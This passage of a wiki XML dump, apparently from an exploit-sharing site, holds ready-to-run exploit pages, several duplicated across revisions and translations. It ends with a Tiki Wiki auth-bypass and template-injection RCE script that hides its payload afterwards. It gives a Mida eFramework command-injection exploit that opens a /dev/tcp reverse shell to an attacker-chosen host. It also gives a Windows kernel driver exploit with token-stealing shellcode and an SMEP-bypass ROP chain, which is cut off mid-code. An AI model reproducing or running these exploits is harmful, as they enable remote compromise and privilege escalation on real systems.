 
def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/&gt;', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)
 
def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())
 
def main():
    if(len(sys.argv) &lt; 4):
        print("(+) usage: %s &lt;host&gt; &lt;path&gt; &lt;cmd&gt;" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)
 
if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>lfobhara21agpli7m3im7e42vr30s8k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15922 Mida eFramework 2.8.9 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4355</id>
    <revision>
      <id>5006</id>
      <timestamp>2021-06-13T01:57:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: &lt;= 2.8.9 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution # Google D..."</comment>
      <origin>5006</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2517" sha1="i3k3465x37efon4n7tx0vg1fw9g3yf8" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt;= 2.8.9
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution
# Google Dork: Server: Mida eFramework
# Date: 2020-08-27
# Exploit Author: elbae
# Vendor Homepage: https://www.midasolutions.com/
# Software Link: http://ova-efw.midasolutions.com/
# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
# Version: &lt;= 2.8.9
# CVE : CVE-2020-15922


#! /usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import base64
import random
import requests
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_disclaimer():
    print("""
    ---------------------
    Disclaimer:
    1) For testing purpose only.
    2) Do not attack production environments.
    3) Intended for educational purposes only and cannot be used for law
violation or personal gain.
    4) The author is not responsible for any possible harm caused by this
material.
    ---------------------""")


def print_info():
    print("""
[*] PoC exploit for Mida eFramework 2.8.9 PDC (CVE-2020-15922)
[*] Reference:https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
[*] Vulnerability: OS Command Injection RCE in PDC/pages/network.php -
Reverse Shell
    ./CVE-2020-15922 http://192.168.1.60:8090/PDC/pages/network.php rev-IP
rev-PORT """)

def run_cmd(url,ip,port):
    rev_shell = "sudo bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1".format(ip,port)
    print("[+] Reverse shell: {0}".format(rev_shell))
    data = {
        "submit":"True",
        "ipaddress0":"; {0}".format(rev_shell),
        "netmask0":"",
        "gateway0":"",
        "dns1":"",
        "dns2":""
    }
    # exec rev shell
    print("[*] Starting reverse shell to {0} {1}...".format(ip,port))
    try:
        r = requests.post(url,data=data,verify=False,timeout=1)
    except requests.exceptions.ReadTimeout:
        print("[?] ...check if it worked")
        pass

def main():
    print_info()
    print_disclaimer()
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str,
        help="the complete target URL")
    parser.add_argument("ip", type=str,
        help="the ip address for reverse shell")
    parser.add_argument("port", type=str,
        help="the port for reverse shell")
    args = parser.parse_args()
    run_cmd(args.target, args.ip, args.port)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>i3k3465x37efon4n7tx0vg1fw9g3yf8</sha1>
    </revision>
    <revision>
      <id>5007</id>
      <parentid>5006</parentid>
      <timestamp>2021-06-13T01:57:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5007</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2528" sha1="ceq0h46azxq0u1g660futad8pbkk9tw" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt;= 2.8.9
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution
# Google Dork: Server: Mida eFramework
# Date: 2020-08-27
# Exploit Author: elbae
# Vendor Homepage: https://www.midasolutions.com/
# Software Link: http://ova-efw.midasolutions.com/
# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
# Version: &lt;= 2.8.9
# CVE : CVE-2020-15922


#! /usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import base64
import random
import requests
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_disclaimer():
    print("""
    ---------------------
    Disclaimer:
    1) For testing purpose only.
    2) Do not attack production environments.
    3) Intended for educational purposes only and cannot be used for law
violation or personal gain.
    4) The author is not responsible for any possible harm caused by this
material.
    ---------------------""")


def print_info():
    print("""
[*] PoC exploit for Mida eFramework 2.8.9 PDC (CVE-2020-15922)
[*] Reference:https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
[*] Vulnerability: OS Command Injection RCE in PDC/pages/network.php -
Reverse Shell
    ./CVE-2020-15922 http://192.168.1.60:8090/PDC/pages/network.php rev-IP
rev-PORT """)

def run_cmd(url,ip,port):
    rev_shell = "sudo bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1".format(ip,port)
    print("[+] Reverse shell: {0}".format(rev_shell))
    data = {
        "submit":"True",
        "ipaddress0":"; {0}".format(rev_shell),
        "netmask0":"",
        "gateway0":"",
        "dns1":"",
        "dns2":""
    }
    # exec rev shell
    print("[*] Starting reverse shell to {0} {1}...".format(ip,port))
    try:
        r = requests.post(url,data=data,verify=False,timeout=1)
    except requests.exceptions.ReadTimeout:
        print("[?] ...check if it worked")
        pass

def main():
    print_info()
    print_disclaimer()
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str,
        help="the complete target URL")
    parser.add_argument("ip", type=str,
        help="the ip address for reverse shell")
    parser.add_argument("port", type=str,
        help="the port for reverse shell")
    args = parser.parse_args()
    run_cmd(args.target, args.ip, args.port)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>ceq0h46azxq0u1g660futad8pbkk9tw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15922 Mida eFramework 2.8.9 遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>4469</id>
    <revision>
      <id>5144</id>
      <timestamp>2021-06-16T02:00:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-15922 Mida eFramework 2.8.9 уязвимость удаленного выполнения кода"</comment>
      <origin>5144</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2513" sha1="2x0tv1j73lnzfdiyzgnpqsdk2u30ta6" xml:space="preserve">&lt;languages /&gt;
==Затронутая версия==
&lt;pre&gt;
Version: &lt;= 2.8.9
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution
# Google Dork: Server: Mida eFramework
# Date: 2020-08-27
# Exploit Author: elbae
# Vendor Homepage: https://www.midasolutions.com/
# Software Link: http://ova-efw.midasolutions.com/
# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
# Version: &lt;= 2.8.9
# CVE : CVE-2020-15922


#! /usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import base64
import random
import requests
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_disclaimer():
    print("""
    ---------------------
    Disclaimer:
    1) For testing purpose only.
    2) Do not attack production environments.
    3) Intended for educational purposes only and cannot be used for law
violation or personal gain.
    4) The author is not responsible for any possible harm caused by this
material.
    ---------------------""")


def print_info():
    print("""
[*] PoC exploit for Mida eFramework 2.8.9 PDC (CVE-2020-15922)
[*] Reference:https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
[*] Vulnerability: OS Command Injection RCE in PDC/pages/network.php -
Reverse Shell
    ./CVE-2020-15922 http://192.168.1.60:8090/PDC/pages/network.php rev-IP
rev-PORT """)

def run_cmd(url,ip,port):
    rev_shell = "sudo bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1".format(ip,port)
    print("[+] Reverse shell: {0}".format(rev_shell))
    data = {
        "submit":"True",
        "ipaddress0":"; {0}".format(rev_shell),
        "netmask0":"",
        "gateway0":"",
        "dns1":"",
        "dns2":""
    }
    # exec rev shell
    print("[*] Starting reverse shell to {0} {1}...".format(ip,port))
    try:
        r = requests.post(url,data=data,verify=False,timeout=1)
    except requests.exceptions.ReadTimeout:
        print("[?] ...check if it worked")
        pass

def main():
    print_info()
    print_disclaimer()
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str,
        help="the complete target URL")
    parser.add_argument("ip", type=str,
        help="the ip address for reverse shell")
    parser.add_argument("port", type=str,
        help="the port for reverse shell")
    args = parser.parse_args()
    run_cmd(args.target, args.ip, args.port)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>2x0tv1j73lnzfdiyzgnpqsdk2u30ta6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15922 Mida eFramework 2.8.9 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4358</id>
    <revision>
      <id>5010</id>
      <timestamp>2021-06-13T01:58:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>5010</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2492" sha1="75njrjt3ynuw25h04dh93qjek6hia9t" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Version: &lt;= 2.8.9
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Mida eFramework 2.8.9 - Remote Code Execution
# Google Dork: Server: Mida eFramework
# Date: 2020-08-27
# Exploit Author: elbae
# Vendor Homepage: https://www.midasolutions.com/
# Software Link: http://ova-efw.midasolutions.com/
# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
# Version: &lt;= 2.8.9
# CVE : CVE-2020-15922


#! /usr/bin/python3
# -*- coding: utf-8 -*-

import argparse
import base64
import random
import requests
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def print_disclaimer():
    print("""
    ---------------------
    Disclaimer:
    1) For testing purpose only.
    2) Do not attack production environments.
    3) Intended for educational purposes only and cannot be used for law
violation or personal gain.
    4) The author is not responsible for any possible harm caused by this
material.
    ---------------------""")


def print_info():
    print("""
[*] PoC exploit for Mida eFramework 2.8.9 PDC (CVE-2020-15922)
[*] Reference:https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
[*] Vulnerability: OS Command Injection RCE in PDC/pages/network.php -
Reverse Shell
    ./CVE-2020-15922 http://192.168.1.60:8090/PDC/pages/network.php rev-IP
rev-PORT """)

def run_cmd(url,ip,port):
    rev_shell = "sudo bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1".format(ip,port)
    print("[+] Reverse shell: {0}".format(rev_shell))
    data = {
        "submit":"True",
        "ipaddress0":"; {0}".format(rev_shell),
        "netmask0":"",
        "gateway0":"",
        "dns1":"",
        "dns2":""
    }
    # exec rev shell
    print("[*] Starting reverse shell to {0} {1}...".format(ip,port))
    try:
        r = requests.post(url,data=data,verify=False,timeout=1)
    except requests.exceptions.ReadTimeout:
        print("[?] ...check if it worked")
        pass

def main():
    print_info()
    print_disclaimer()
    parser = argparse.ArgumentParser()
    parser.add_argument("target", type=str,
        help="the complete target URL")
    parser.add_argument("ip", type=str,
        help="the ip address for reverse shell")
    parser.add_argument("port", type=str,
        help="the port for reverse shell")
    args = parser.parse_args()
    run_cmd(args.target, args.ip, args.port)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>75njrjt3ynuw25h04dh93qjek6hia9t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-16040 Google Chrome V8 heap corruption 漏洞</title>
    <ns>0</ns>
    <id>793</id>
    <revision>
      <id>1047</id>
      <timestamp>2021-04-06T11:34:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Works for chrome version &lt;= 87.0.4280.88  ==EXP== https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040   [[File:EyNLyWFVoAUe0h5.jpg |800px]]"</comment>
      <origin>1047</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="159" sha1="izz14lmx1r42e5w6p9eqjkmyriy4wv1" xml:space="preserve">==INFO==
Works for chrome version &lt;= 87.0.4280.88

==EXP==
https://github.com/r4j0x00/exploits/tree/master/CVE-2020-16040


[[File:EyNLyWFVoAUe0h5.jpg |800px]]</text>
      <sha1>izz14lmx1r42e5w6p9eqjkmyriy4wv1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-17382 MSI Ambient Link Driver 1.0.0.8 本地權限提升漏洞</title>
    <ns>0</ns>
    <id>4349</id>
    <revision>
      <id>4999</id>
      <timestamp>2021-06-13T01:54:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: 1.0.0.8 &lt;/pre&gt;  ==EXP== &lt;pre&gt; /* Exploit Title: MSI Ambient Link Driver 1.0.0.8 - Local Privilege Escala..."</comment>
      <origin>4999</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7340" sha1="ea5aqlqjuzhi8g5gf9cpvc0ha5v819b" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: 1.0.0.8
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
/*
Exploit Title: MSI Ambient Link Driver 1.0.0.8 - Local Privilege Escalation
Date: 2020-09-24
Exploit Author: Matteo Malvica
Vendor Homepage: https://www.msi.com
Software Link: https://msi.gm/ABLTMNB
Driver: MSIO64.sys
SHA256: 525D9B51A80CA0CD4C5889A96F857E73F3A80DA1FFBAE59851E0F51BDFB0B6CD
Version: 1.0.0.8
Tested on: Windows 10 1709 [19041.1.amd64fre.vb_release.191206-1406]
MSI Ambient Link Driver 1.0.0.8 Kernel Stack Based Buffer Overflow / Local Privilege Escalation
CVE: CVE-2020-17382
Writeup: https://www.matteomalvica.com/blog/2020/09/24/weaponizing-cve-2020-17382/
Original advisory: https://www.coresecurity.com/core-labs/advisories/msi-ambient-link-multiple-vulnerabilities
*/

#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;

#pragma warning( disable : 6387 )

VOID eopMsio(HANDLE hFile, INT64 kernel_base, DWORD pid, DWORD IoControlCode) {
          // SHELLCODE FOR 1709
          BYTE token_steal[] =
          "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
          "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd&gt; u PsGetCurrentProcess)
          "\x4D\x8B\x88\xe8\x02\x00\x00"              // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
          "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
          //find_system_proc:
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
          "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
          "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
          "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
          //found_system:
          "\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
          "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
          //find cmd
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx-8]         ;ActiveProcessLinks - 8 = UniqueProcessId
          "\x48\x81\xFA\x99\x99\x00\x00"              // cmp rdx, 0d54h           ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
          "\x74\x05"                                  // jz found_cmd             ;YES - move on
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ;NO - next entry in list
          "\xEB\xEE"                                  // jmp find_cmd             ;loop
          // found cmd
          "\x48\x89\x41\x70"                          // mov [rcx+70h], rax       ;copy SYSTEM token over top of this process's token
          "\x48\x31\xc9"                              // xor rcx rcx              ; clear some registers to avoid issues while unwinding the call stack
          "\x48\x31\xc0"                              // xor rax rax
          "\x48\x31\xf6"                              // xor rsi,rsi
          "\x48\x31\xff"                              // xor rdi, rdi
          "\x4D\x31\xC0"                              // xor r8, r8
          "\x48\xc7\xc1\xf8\x06\x15\x00"              // mov rcx, 0x1506f8        ; move original cr4 value into rcx
          "\xc3";                                     // ret                      ; RET

    token_steal[54] = pid;
    token_steal[55] = pid &gt;&gt; 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL,
        sizeof(token_steal),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    INT64 pop_rcx_offset = kernel_base + 0x15fc70;            // gadget 1 1709 - pop rcx ; ret
    INT64 mov_cr4_offset = kernel_base + 0x76a02;             // gadget 2 1709 - mov cr4, ecx ; ret
    INT64 wbindv_offset = kernel_base + 0x1175c0;;            // gadget 3 1709 - wbinvd; ret
    INT64 rcx_value = 0x506f8;                                // value we want placed in cr4 in order to disable SMEP
    INT64 rcx_old_value = 0x1506f8;                           // original cr4 value         
    INT64 ret = pop_rcx_offset + 1;                           // RET NOP

    puts("[+] SMEP disabled");
    
    BYTE  input_buff[136] = { 0 };
    memset(input_buff, '\x41', 64);
    memset(input_buff, '\x42', 8);                            // dummy RBP
    memcpy(input_buff + 72, (PINT64)&amp;pop_rcx_offset, 8);      // pop rcx
    memcpy(input_buff + 80, (PINT64)&amp;rcx_value, 8);           // disable SMEP value
    memcpy(input_buff + 88, (PINT64)&amp;mov_cr4_offset, 8);      // mov cr4, rcx
    memcpy(input_buff + 96, (PINT64)&amp;wbindv_offset, 8);       // wbinvd; ret
    memcpy(input_buff + 104, (PINT64)&amp;allocated_shellcode, 8);// shellcode
    memcpy(input_buff + 112, (PINT64)&amp;mov_cr4_offset, 8);     // mov cr4, rcx 
    memcpy(input_buff + 120, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack
    memcpy(input_buff + 128, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack

    printf("[+] Payload buffer located at: 0x%p\n", &amp;allocated_shellcode);

    DWORD lpBytesReturned = 0x0;
    BOOL triggerIOCTL = DeviceIoControl(hFile,
        IoControlCode,
        input_buff,
        sizeof(input_buff),
        NULL,
        0,
        &amp;lpBytesReturned,
        NULL);

    if (!triggerIOCTL) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    }
    else {
        puts("[+] SMEP re-enabled");
        puts("[+] Enjoy your SYSTEM shell\n");
    }

    system("start cmd.exe");
}

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i &lt; nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

HANDLE GetDriverHandle() {
    HANDLE hMsio;

    hMsio = CreateFileA("\\\\.\\MsIo",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hMsio == INVALID_HANDLE_VALUE) {
        printf("[-] Error obtaining an handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    return hMsio;
}

int main() {
    puts("[*] CVE-2020-17382 - Win10 1709 - PoC by Matteo 'uf0' Malvica");
    DWORD IoControlCode = 0x80102040;
    HANDLE hDevice = GetDriverHandle();
    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    DWORD pid = GetCurrentProcessId();

    eopMsio(hDevice, nt, pid, IoControlCode);

    return 0;
}
&lt;/pre&gt;</text>
      <sha1>ea5aqlqjuzhi8g5gf9cpvc0ha5v819b</sha1>
    </revision>
    <revision>
      <id>5000</id>
      <parentid>4999</parentid>
      <timestamp>2021-06-13T01:55:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5000</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7351" sha1="2zl534euus2st4bwmbwwpogo4mjjq8j" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: 1.0.0.8
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
/*
Exploit Title: MSI Ambient Link Driver 1.0.0.8 - Local Privilege Escalation
Date: 2020-09-24
Exploit Author: Matteo Malvica
Vendor Homepage: https://www.msi.com
Software Link: https://msi.gm/ABLTMNB
Driver: MSIO64.sys
SHA256: 525D9B51A80CA0CD4C5889A96F857E73F3A80DA1FFBAE59851E0F51BDFB0B6CD
Version: 1.0.0.8
Tested on: Windows 10 1709 [19041.1.amd64fre.vb_release.191206-1406]
MSI Ambient Link Driver 1.0.0.8 Kernel Stack Based Buffer Overflow / Local Privilege Escalation
CVE: CVE-2020-17382
Writeup: https://www.matteomalvica.com/blog/2020/09/24/weaponizing-cve-2020-17382/
Original advisory: https://www.coresecurity.com/core-labs/advisories/msi-ambient-link-multiple-vulnerabilities
*/

#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;

#pragma warning( disable : 6387 )

VOID eopMsio(HANDLE hFile, INT64 kernel_base, DWORD pid, DWORD IoControlCode) {
          // SHELLCODE FOR 1709
          BYTE token_steal[] =
          "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
          "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd&gt; u PsGetCurrentProcess)
          "\x4D\x8B\x88\xe8\x02\x00\x00"              // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
          "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
          //find_system_proc:
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
          "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
          "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
          "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
          //found_system:
          "\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
          "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
          //find cmd
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx-8]         ;ActiveProcessLinks - 8 = UniqueProcessId
          "\x48\x81\xFA\x99\x99\x00\x00"              // cmp rdx, 0d54h           ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
          "\x74\x05"                                  // jz found_cmd             ;YES - move on
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ;NO - next entry in list
          "\xEB\xEE"                                  // jmp find_cmd             ;loop
          // found cmd
          "\x48\x89\x41\x70"                          // mov [rcx+70h], rax       ;copy SYSTEM token over top of this process's token
          "\x48\x31\xc9"                              // xor rcx rcx              ; clear some registers to avoid issues while unwinding the call stack
          "\x48\x31\xc0"                              // xor rax rax
          "\x48\x31\xf6"                              // xor rsi,rsi
          "\x48\x31\xff"                              // xor rdi, rdi
          "\x4D\x31\xC0"                              // xor r8, r8
          "\x48\xc7\xc1\xf8\x06\x15\x00"              // mov rcx, 0x1506f8        ; move original cr4 value into rcx
          "\xc3";                                     // ret                      ; RET

    token_steal[54] = pid;
    token_steal[55] = pid &gt;&gt; 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL,
        sizeof(token_steal),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    INT64 pop_rcx_offset = kernel_base + 0x15fc70;            // gadget 1 1709 - pop rcx ; ret
    INT64 mov_cr4_offset = kernel_base + 0x76a02;             // gadget 2 1709 - mov cr4, ecx ; ret
    INT64 wbindv_offset = kernel_base + 0x1175c0;;            // gadget 3 1709 - wbinvd; ret
    INT64 rcx_value = 0x506f8;                                // value we want placed in cr4 in order to disable SMEP
    INT64 rcx_old_value = 0x1506f8;                           // original cr4 value         
    INT64 ret = pop_rcx_offset + 1;                           // RET NOP

    puts("[+] SMEP disabled");
    
    BYTE  input_buff[136] = { 0 };
    memset(input_buff, '\x41', 64);
    memset(input_buff, '\x42', 8);                            // dummy RBP
    memcpy(input_buff + 72, (PINT64)&amp;pop_rcx_offset, 8);      // pop rcx
    memcpy(input_buff + 80, (PINT64)&amp;rcx_value, 8);           // disable SMEP value
    memcpy(input_buff + 88, (PINT64)&amp;mov_cr4_offset, 8);      // mov cr4, rcx
    memcpy(input_buff + 96, (PINT64)&amp;wbindv_offset, 8);       // wbinvd; ret
    memcpy(input_buff + 104, (PINT64)&amp;allocated_shellcode, 8);// shellcode
    memcpy(input_buff + 112, (PINT64)&amp;mov_cr4_offset, 8);     // mov cr4, rcx 
    memcpy(input_buff + 120, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack
    memcpy(input_buff + 128, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack

    printf("[+] Payload buffer located at: 0x%p\n", &amp;allocated_shellcode);

    DWORD lpBytesReturned = 0x0;
    BOOL triggerIOCTL = DeviceIoControl(hFile,
        IoControlCode,
        input_buff,
        sizeof(input_buff),
        NULL,
        0,
        &amp;lpBytesReturned,
        NULL);

    if (!triggerIOCTL) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    }
    else {
        puts("[+] SMEP re-enabled");
        puts("[+] Enjoy your SYSTEM shell\n");
    }

    system("start cmd.exe");
}

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i &lt; nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

HANDLE GetDriverHandle() {
    HANDLE hMsio;

    hMsio = CreateFileA("\\\\.\\MsIo",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
